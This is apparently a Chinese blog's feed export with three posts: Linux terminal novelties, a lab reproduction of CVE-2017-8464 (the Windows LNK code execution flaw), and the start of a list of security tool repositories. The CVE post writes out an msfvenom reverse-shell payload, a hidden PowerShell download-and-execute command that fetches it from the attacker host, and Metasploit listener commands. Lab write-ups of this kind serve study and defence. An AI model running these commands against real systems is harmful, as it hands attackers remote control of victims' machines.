&lt;span class=”hljs-</em>“&gt;-f -L <span class="hljs-variable">$i</span>;sleep 1;<span class="hljs-keyword">done</span><br></code></pre><br><p>终端录制效果动画:</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027022786527.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="终端录制效果动画" data-original="http://image.3001.net/images/20170814/15027022786527.gif!small" src="http://image.3001.net/images/20170814/15027022786527.gif!small" width="690" style="display: inline;"></a>    </p><br><noscript>&lt;img alt=”终端录制效果动画” src=”<a href="http://image.3001.net/images/20170814/15027022786527.gif!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027022786527.gif!small</a>“ width=”690” height=”347”&gt;    &lt;/p&gt;</noscript><br><h2>sl</h2><br><h3>简介</h3><br><p>你可能了解Linux的<code>ls</code>命令，并经常使用它来查看文件夹的内容。但是，有些时候你可能会拼写成<code>sl</code>&nbsp;,这时我们应该如何获得一些乐趣而不是看见“command not found”呢？    <br>某编程牛人也经常犯把<code>ls</code>敲成<code>sl</code>的错误，所以他自己编了一个程序娱乐一下,这个程序的作用很简单，就是当你输入sl的时候终端会出现一个火车呼啸而过～～</p><br><h3>安装</h3><br><pre><code class="hljs cs"><span class="token function" style="color:rgb(121,93,163);">apt-<span class="hljs-keyword">get</span></span> <span class="token function" style="color:rgb(121,93,163);">install</span> sl<br></code></pre><br><h3>效果演示</h3><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027023133516.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="效果演示" data-original="http://image.3001.net/images/20170814/15027023133516.gif!small" src="http://image.3001.net/images/20170814/15027023133516.gif!small" width="690" style="display: inline;"></a>    </p><br><noscript>&lt;img alt=”效果演示” src=”<a href="http://image.3001.net/images/20170814/15027023133516.gif!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027023133516.gif!small</a>“ width=”690” height=”347”&gt;    &lt;/p&gt;</noscript><br><h2>cmatrix</h2><br><h3>简介</h3><br><p>《黑客帝国》的代码雨视觉特效。</p><br><h3>安装</h3><br><pre><code class="hljs cs">apt-<span class="hljs-keyword">get</span> install cmatrix<br></code></pre><br><h3>参数解释</h3><br><pre><code class="hljs diff"><span class="hljs-deletion">-B: 字体加粗</span><br><span class="hljs-deletion">-C: 颜色 后面跟上参数颜色</span><br></code></pre><br><h3>效果演示</h3><br><pre><code class="hljs nginx"><span class="hljs-attribute">cmatrix</span><br></code></pre><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027023279171.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="效果演示" data-original="http://image.3001.net/images/20170814/15027023279171.png!small" src="http://image.3001.net/images/20170814/15027023279171.png!small" width="690" style="display: inline;"></a></p><br><noscript>&lt;img alt=”效果演示” src=”<a href="http://image.3001.net/images/20170814/15027023279171.png!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027023279171.png!small</a>“ width=”690” height=”365”&gt;&lt;/p&gt;</noscript><br><p style="">终端录制动画显示:</p><br><pre><code class="hljs nginx"><span class="hljs-attribute">cmatrix</span> -B -C red<br></code></pre><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/1502702358166.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="终端录制动画显示" data-original="http://image.3001.net/images/20170814/1502702358166.gif!small" src="http://image.3001.net/images/20170814/1502702358166.gif!small" width="690" style="display: inline;"></a>    </p><br><noscript>&lt;img alt=”终端录制动画显示” src=”<a href="http://image.3001.net/images/20170814/1502702358166.gif!small" target="_blank" rel="external">http://image.3001.net/images/20170814/1502702358166.gif!small</a>“ width=”690” height=”347”&gt;    &lt;/p&gt;</noscript><br><h2>cowsay</h2><br><h3>简介</h3><br><p>Cowsay命令是一个有趣的命令。它会用ASCII字符描绘牛，羊和许多其他动物。但是不是每个Linux发行版都带有这个命令。</p><br><h3>安装</h3><br><pre><code class="hljs cs"><span class="token function" style="color:rgb(121,93,163);">apt-<span class="hljs-keyword">get</span></span> <span class="token function" style="color:rgb(121,93,163);">install</span> cowsay<br></code></pre><br><h2>参数解释</h2><br><p>列出所有支持可用的动物:<code>cowsay -l list</code></p><br><pre><code class="hljs ruby">ctf@guoguang<span class="hljs-symbol">:~</span>$ cowsay -l list<br>Cow files <span class="token keyword" style="color:rgb(0,134,179);"><span class="hljs-keyword">in</span></span> /usr/share/cowsay/<span class="hljs-symbol">cows:</span><br>apt beavis.zen bong bud-frogs bunny calvin cheese cock cower daemon default<br>dragon dragon-<span class="hljs-keyword">and</span>-cow duck elephant elephant-<span class="hljs-keyword">in</span>-snake eyes flaming-sheep<br>ghostbusters gnu head-<span class="hljs-keyword">in</span> hellokitty kiss koala kosh luke-koala mech-<span class="hljs-keyword">and</span>-cow<br>milk moofasa moose mutilated pony pony-smaller ren sheep skeleton snowman<br>sodomized-sheep stegosaurus stimpy suse three-eyes turkey turtle tux<br>unipony unipony-smaller vader vader-koala www<br></code></pre><br><p>使用不同的动物来输出字符:</p><br><pre><code class="hljs bash">cowsay <span class="hljs-_">-f</span> 动物 内容<br></code></pre><br><h3>效果演示</h3><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027023874433.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="效果演示" data-original="http://image.3001.net/images/20170814/15027023874433.png!small" src="http://image.3001.net/images/20170814/15027023874433.png!small" width="688" style="display: inline;"></a>    </p><br><noscript>&lt;img alt=”效果演示” src=”<a href="http://image.3001.net/images/20170814/15027023874433.png!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027023874433.png!small</a>“ width=”688” height=”272”&gt;    &lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027023942875.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="效果演示" data-original="http://image.3001.net/images/20170814/15027023942875.png!small" src="http://image.3001.net/images/20170814/15027023942875.png!small" width="681" style="display: inline;"></a>    </p><br><noscript>&lt;img alt=”效果演示” src=”<a href="http://image.3001.net/images/20170814/15027023942875.png!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027023942875.png!small</a>“ width=”681” height=”451”&gt;    &lt;/p&gt;</noscript><br><h2>asciinema</h2><br><h3>简介</h3><br><p>本文其实最初很多特效都用这个终端去录制的，但是由于需要引用外部的js，所以最后这些终端下的特效才换成了gif图。asciineme 可以完美录制完美终端下所敲的命令。    <br><strong style="color: rgb(0, 0, 0);">官网</strong>:<a href="https://asciinema.org/" rel="external" target="_blank">https://asciinema.org/</a></p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027024308041.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="asciinema官网" data-original="http://image.3001.net/images/20170814/15027024308041.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690"></a>    </p><br><noscript>&lt;img alt=”asciinema官网” src=”<a href="http://image.3001.net/images/20170814/15027024308041.png!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027024308041.png!small</a>“ width=”690” height=”307”&gt;    &lt;/p&gt;</noscript><br><h3>安装</h3><br><pre><code class="hljs cs"><span class="token function" style="color:rgb(121,93,163);">apt-<span class="hljs-keyword">get</span></span> <span class="token function" style="color:rgb(121,93,163);">install</span> asciinema<br></code></pre><br><h3>操作详解</h3><br><p>安装完成后终端输入:</p><br><pre><code class="hljs nginx"><span class="hljs-attribute">asciinema</span> rec<br></code></pre><br><p>开始 终端录制,接下来所以的操作 都会被录制下来，然后保为一个<code>json</code>文件。    <br>结束录制的话，使用快捷键:    <br><code>Ctrl</code>+<code>D</code>    <br>或者敲命令:</p><br><pre><code class="hljs cpp"><span class="hljs-built_in">exit</span><br></code></pre><br><p>结束录制。</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027024842325.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="操作详情" data-original="http://image.3001.net/images/20170814/15027024842325.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690"></a></p><br><noscript>&lt;img alt=”操作详情” src=”<a href="http://image.3001.net/images/20170814/15027024842325.png!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027024842325.png!small</a>“ width=”690” height=”187.14622641509433”&gt;&lt;/p&gt;</noscript><br><p>然后按<code>回车</code>键可以上传自己录制的终端操作到官网，或者按“Ctrl<code>+</code>C`不保存此次录制。</p><br><h3>实用技能</h3><br><p>上传完成后，官网会给出已经上传在云端的链接，此时可以下载下来这个<code>json</code>文件。在网站中实用的话,得引入一个<code>css</code>和一个<code>js</code>脚本。当然闲国外网速慢的话,可以完全把这些文件下载下来上传到其他的云存储里面,来获取外链。</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/08/118a586ce211c983c1581e109507a80b.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/08/118a586ce211c983c1581e109507a80b.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="Markdown" width="690"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/08/118a586ce211c983c1581e109507a80b.png" target="_blank" rel="external">http://image.3001.net/2017/08/118a586ce211c983c1581e109507a80b.png</a>“ alt=”Markdown” width=”690” height=”535.84229390681”&gt;&lt;/p&gt;</noscript><br><p style="">当然还有其他可玩的姿势等待去研究探索</p><br><p style=""><b style="color: rgb(159, 163, 168);">*———–来自 FreeBuf.COM</b></p><br>                                                    </div>
]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;contenttxt&quot;&gt;&lt;br&gt;                            &lt;h2&gt;&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;前言&lt;/span&gt;&lt;br&gt;&lt;/h2&gt;&lt;br&gt;&lt;p&gt;&lt;b style=&quot;color: rgb(0, 176, 80);&quot;&gt;刚开始接触Linux的我们，肯定认为Linux系统就是那种枯燥的终端界面。然而实际上Linux下的终端还是有很多种有趣的玩法&lt;del&gt;&lt;/del&gt;&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;br&gt;&lt;h2&gt;toilet&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;简介&lt;/h3&gt;&lt;br&gt;&lt;p&gt;&lt;code&gt;toilet&lt;/code&gt;能用字母拼写出更大字母的工具，具体拼出什么字由命令后面的参数决定，不仅如此，它还能打印出各种风格的效果，比如彩色，金属光泽等。&lt;/p&gt;&lt;br&gt;&lt;h3&gt;安装&lt;/h3&gt;&lt;br&gt;&lt;pre&gt;&lt;code class=&quot;hljs cs&quot;&gt;&lt;span class=&quot;token function&quot; style=&quot;color:rgb(121,93,163);&quot;&gt;apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot; style=&quot;color:rgb(121,93,163);&quot;&gt;install&lt;/span&gt; toilet&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&lt;h3&gt;参数解释&lt;/h3&gt;&lt;br&gt;&lt;pre&gt;&lt;code class=&quot;hljs bash&quot;&gt;toilet &lt;span class=&quot;hljs-_&quot;&gt;-f&lt;/span&gt; mono12 -F metal FreeBuf&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&lt;p&gt;这里&amp;nbsp;&lt;code&gt;mono12&lt;/code&gt;是字体参数值,&amp;nbsp;&lt;code&gt;meta&lt;/code&gt;是颜色参数值&amp;nbsp;&lt;code&gt;FreeBuf&lt;/code&gt;是我们想要操作的字体。    &lt;br&gt;有如下字体可以选择:&lt;/p&gt;&lt;br&gt;&lt;pre&gt;&lt;code class=&quot;hljs ruby&quot;&gt;ctf@guoguang&lt;span class=&quot;hljs-symbol&quot;&gt;:/usr/share/figlet&lt;/span&gt;$ ls&lt;br&gt;ascii12.tlf     bigascii9.tlf  circle.tlf   future.tlf  mono9.tlf      smascii9.tlf   smmono12.tlf&lt;br&gt;ascii9.tlf      bigmono12.tlf  emboss2.tlf  letter.tlf  pagga.tlf      smblock.tlf    smmono9.tlf&lt;br&gt;bigascii12.tlf  bigmono9.tlf   emboss.tlf   mono12.tlf  smascii12.tlf  smbraille.tlf  wideterm.tlf&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&lt;p&gt;颜色参数有如下选项:&lt;/p&gt;&lt;br&gt;&lt;pre&gt;&lt;code class=&quot;hljs ruby&quot;&gt;ctf@guoguang&lt;span class=&quot;hljs-symbol&quot;&gt;:~&lt;/span&gt;$ toilet –filter list&lt;br&gt;Available &lt;span class=&quot;hljs-symbol&quot;&gt;filters:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“crop”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; crop unused blanks&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“gay”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; add a rainbow colour effect&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“metal”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; add a metallic colour effect&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“flip”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; flip horizontally&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“flop”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; flip vertically&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“180”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; rotate &lt;span class=&quot;hljs-number&quot;&gt;180&lt;/span&gt; degrees&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“left”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; rotate &lt;span class=&quot;hljs-number&quot;&gt;90&lt;/span&gt; degrees counterclockwise&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“right”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; rotate &lt;span class=&quot;hljs-number&quot;&gt;90&lt;/span&gt; degrees clockwise&lt;br&gt;&lt;span class=&quot;hljs-string&quot;&gt;“border”&lt;/span&gt;&lt;span class=&quot;hljs-symbol&quot;&gt;:&lt;/span&gt; surround text with a border&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&lt;h3&gt;效果演示&lt;/h3&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/images/20170814/15027021215532.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;效果演示&quot; data-original=&quot;http://image.3001.net/images/20170814/15027021215532.png!small&quot; src=&quot;http://image.3001.net/images/20170814/15027021215532.png!small&quot; width=&quot;690&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;    &lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img alt=”效果演示” src=”&lt;a href=&quot;http://image.3001.net/images/20170814/15027021215532.png!small&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/images/20170814/15027021215532.png!small&lt;/a&gt;“ width=”690” height=”840.7738998482549”&amp;gt;    &amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;br&gt;
    
    </summary>
    
      <category term="生活娱乐" scheme="http://yingzhzh.github.io/categories/%E7%94%9F%E6%B4%BB%E5%A8%B1%E4%B9%90/"/>
    
    
      <category term="linux" scheme="http://yingzhzh.github.io/tags/linux/"/>
    
      <category term="shell" scheme="http://yingzhzh.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-8464远程命令执行漏洞复现</title>
    <link href="http://yingzhzh.github.io/2017/08/07/cve-2017-8464/"/>
    <id>http://yingzhzh.github.io/2017/08/07/cve-2017-8464/</id>
    <published>2017-08-07T05:27:50.000Z</published>
    <updated>2017-08-18T07:33:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="http://www.cnblogs.com/backlion/p/7025918.html" target="_blank" rel="external">http://www.cnblogs.com/backlion/p/7025918.html</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危</p>
<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。<br>注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名。<br>漏洞利用条件和方式: </p>
<h1 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h1><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围:"></a>漏洞影响范围:</h2><p>Microsoft Windows 10 Version 1607 for 32-bit Systems<br>Microsoft Windows 10 Version 1607 for x64-based Systems<br>Microsoft Windows 10 for 32-bit Systems<br>Microsoft Windows 10 for x64-based Systems<br>Microsoft Windows 10 version 1511 for 32-bit Systems<br>Microsoft Windows 10 version 1511 for x64-based Systems<br>Microsoft Windows 10 version 1703 for 32-bit Systems<br>Microsoft Windows 10 version 1703 for x64-based Systems<br>Microsoft Windows 7 for 32-bit Systems SP1<br>Microsoft Windows 7 for x64-based Systems SP1<br>Microsoft Windows 8.1 for 32-bit Systems<br>Microsoft Windows 8.1 for x64-based Systems<br>Microsoft Windows RT 8.1</p>
<p>服务器系统<br>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1<br>Microsoft Windows Server 2008 R2 for x64-based Systems SP1<br>Microsoft Windows Server 2008 for 32-bit Systems SP2<br>Microsoft Windows Server 2008 for Itanium-based Systems SP2<br>Microsoft Windows Server 2008 for x64-based Systems SP2<br>Microsoft Windows Server 2012<br>Microsoft Windows Server 2012 R2<br>Microsoft Windows Server 2016</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h1><h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机中病毒。<br><a id="more"></a></p>
<h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>攻击机：kali  ip：10.0.0.140<br>目标靶机：win2008r2x64 ip:192.168.99.104</p>
<p>1.kali下生成一个反弹的 ps1的shell:</p>
<pre><code>msfvenom  -p   windows/x64/meterpreter/reverse_tcp  lhost=10.0.0.140   lport=5555  -f  psh-reflection&gt;/opt/search.ps1
</code></pre><p><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3w8pvluj20fi03k425.jpg" alt=""></p>
<p>2.切换到opt目录，然后查看到已生成了search.ps1 的powershell 后门</p>
<pre><code>cd /opt
ls
</code></pre><p><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3w8sh4sj20fi03wwi7.jpg" alt=""></p>
<p>3.将生成的search.ps1拷贝到/var/www/html目录下</p>
<pre><code>mv  search.ps1  /var/www/html
ls
</code></pre><p><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3w67ucvj20e202maca.jpg" alt=""></p>
<p>4.启动apache服务</p>
<p>service apache2 start<br><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3w4pxtrj20e201q3zy.jpg" alt=""></p>
<p>5.访问web下的search.ps1，可以直接访问：<br><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3w5h27dj20fi06tq4o.jpg" alt=""></p>
<p>6.在靶机上创建一个powershell远程快捷：</p>
<pre><code>powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.0.0.140/search.ps1&apos;);test.ps1&quot;
</code></pre><p><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3w5dzeqj20fi0bt0uc.jpg" alt=""></p>
<p>7.名称为:powershell.exe</p>
<p> <img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3w6jcyoj20fi0b43z0.jpg" alt=""></p>
<p>8.kali下创建监听反弹，并且可以看到成功反弹出靶机的shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">show options</div><div class="line">set LHOST 10.0.0.140</div><div class="line">set lport  5555  </div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3wdrryaj20fi0837c3.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib3wd10b9j20fi05y7a0.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fib44302wlj20fi089wm5.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文：&lt;a href=&quot;http://www.cnblogs.com/backlion/p/7025918.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/backlion/p/7025918.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危&lt;/p&gt;
&lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;p&gt;攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。&lt;br&gt;注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名。&lt;br&gt;漏洞利用条件和方式: &lt;/p&gt;
&lt;h1 id=&quot;远程利用&quot;&gt;&lt;a href=&quot;#远程利用&quot; class=&quot;headerlink&quot; title=&quot;远程利用&quot;&gt;&lt;/a&gt;远程利用&lt;/h1&gt;&lt;h2 id=&quot;漏洞影响范围&quot;&gt;&lt;a href=&quot;#漏洞影响范围&quot; class=&quot;headerlink&quot; title=&quot;漏洞影响范围:&quot;&gt;&lt;/a&gt;漏洞影响范围:&lt;/h2&gt;&lt;p&gt;Microsoft Windows 10 Version 1607 for 32-bit Systems&lt;br&gt;Microsoft Windows 10 Version 1607 for x64-based Systems&lt;br&gt;Microsoft Windows 10 for 32-bit Systems&lt;br&gt;Microsoft Windows 10 for x64-based Systems&lt;br&gt;Microsoft Windows 10 version 1511 for 32-bit Systems&lt;br&gt;Microsoft Windows 10 version 1511 for x64-based Systems&lt;br&gt;Microsoft Windows 10 version 1703 for 32-bit Systems&lt;br&gt;Microsoft Windows 10 version 1703 for x64-based Systems&lt;br&gt;Microsoft Windows 7 for 32-bit Systems SP1&lt;br&gt;Microsoft Windows 7 for x64-based Systems SP1&lt;br&gt;Microsoft Windows 8.1 for 32-bit Systems&lt;br&gt;Microsoft Windows 8.1 for x64-based Systems&lt;br&gt;Microsoft Windows RT 8.1&lt;/p&gt;
&lt;p&gt;服务器系统&lt;br&gt;Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1&lt;br&gt;Microsoft Windows Server 2008 R2 for x64-based Systems SP1&lt;br&gt;Microsoft Windows Server 2008 for 32-bit Systems SP2&lt;br&gt;Microsoft Windows Server 2008 for Itanium-based Systems SP2&lt;br&gt;Microsoft Windows Server 2008 for x64-based Systems SP2&lt;br&gt;Microsoft Windows Server 2012&lt;br&gt;Microsoft Windows Server 2012 R2&lt;br&gt;Microsoft Windows Server 2016&lt;/p&gt;
&lt;h1 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现:&quot;&gt;&lt;/a&gt;漏洞复现:&lt;/h1&gt;&lt;h2 id=&quot;利用原理：&quot;&gt;&lt;a href=&quot;#利用原理：&quot; class=&quot;headerlink&quot; title=&quot;利用原理：&quot;&gt;&lt;/a&gt;利用原理：&lt;/h2&gt;&lt;p&gt;创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机中病毒。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="http://yingzhzh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="CVE-2017-8464" scheme="http://yingzhzh.github.io/tags/CVE-2017-8464/"/>
    
      <category term="震网漏洞" scheme="http://yingzhzh.github.io/tags/%E9%9C%87%E7%BD%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Github 安全类Repo收集整理</title>
    <link href="http://yingzhzh.github.io/2017/08/03/git-sec-repo-hub/"/>
    <id>http://yingzhzh.github.io/2017/08/03/git-sec-repo-hub/</id>
    <published>2017-08-03T02:45:36.000Z</published>
    <updated>2017-08-04T01:13:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文地址:<a href="https://zhuanlan.zhihu.com/p/21380662" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21380662</a><br>转:<a href="http://zone.wooyun.org/content/28363" target="_blank" rel="external">http://zone.wooyun.org/content/28363</a><br>作者:天谕 链接:<a href="https://zhuanlan.zhihu.com/p/21380662" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21380662</a><br>来源:知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<h3 id="漏洞及渗透练习平台："><a href="#漏洞及渗透练习平台：" class="headerlink" title="漏洞及渗透练习平台："></a>漏洞及渗透练习平台：</h3><h4 id="WebGoat漏洞练习环境"><a href="#WebGoat漏洞练习环境" class="headerlink" title="WebGoat漏洞练习环境"></a>WebGoat漏洞练习环境</h4><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="external">https://github.com/WebGoat/WebGoat</a><br><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="external">https://github.com/WebGoat/WebGoat-Legacy</a></p>
<h4 id="Damn-Vulnerable-Web-Application-漏洞练习平台"><a href="#Damn-Vulnerable-Web-Application-漏洞练习平台" class="headerlink" title="Damn Vulnerable Web Application(漏洞练习平台)"></a>Damn Vulnerable Web Application(漏洞练习平台)</h4><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="external">https://github.com/RandomStorm/DVWA</a></p>
<h4 id="数据库注入练习平台"><a href="#数据库注入练习平台" class="headerlink" title="数据库注入练习平台"></a>数据库注入练习平台</h4><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a></p>
<h4 id="用node编写的漏洞练习平台，like-OWASP-Node-Goat"><a href="#用node编写的漏洞练习平台，like-OWASP-Node-Goat" class="headerlink" title="用node编写的漏洞练习平台，like OWASP Node Goat"></a>用node编写的漏洞练习平台，like OWASP Node Goat</h4><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="external">https://github.com/cr0hn/vulnerable-node</a></p>
<h3 id="花式扫描器-："><a href="#花式扫描器-：" class="headerlink" title="花式扫描器 ："></a>花式扫描器 ：</h3><h4 id="端口扫描器Nmap"><a href="#端口扫描器Nmap" class="headerlink" title="端口扫描器Nmap"></a>端口扫描器Nmap</h4><p><a href="https://github.com/nmap/nmap" target="_blank" rel="external">https://github.com/nmap/nmap</a></p>
<h4 id="本地网络扫描器"><a href="#本地网络扫描器" class="headerlink" title="本地网络扫描器"></a>本地网络扫描器</h4><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="external">https://github.com/SkyLined/LocalNetworkScanner</a></p>
<h4 id="子域名扫描器"><a href="#子域名扫描器" class="headerlink" title="子域名扫描器"></a>子域名扫描器</h4><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="external">https://github.com/lijiejie/subDomainsBrute</a></p>
<h4 id="漏洞路由扫描器"><a href="#漏洞路由扫描器" class="headerlink" title="漏洞路由扫描器"></a>漏洞路由扫描器</h4><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="external">https://github.com/jh00nbr/Routerhunter-2.0</a></p>
<h4 id="迷你批量信息泄漏扫描脚本"><a href="#迷你批量信息泄漏扫描脚本" class="headerlink" title="迷你批量信息泄漏扫描脚本"></a>迷你批量信息泄漏扫描脚本</h4><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="external">https://github.com/lijiejie/BBScan</a></p>
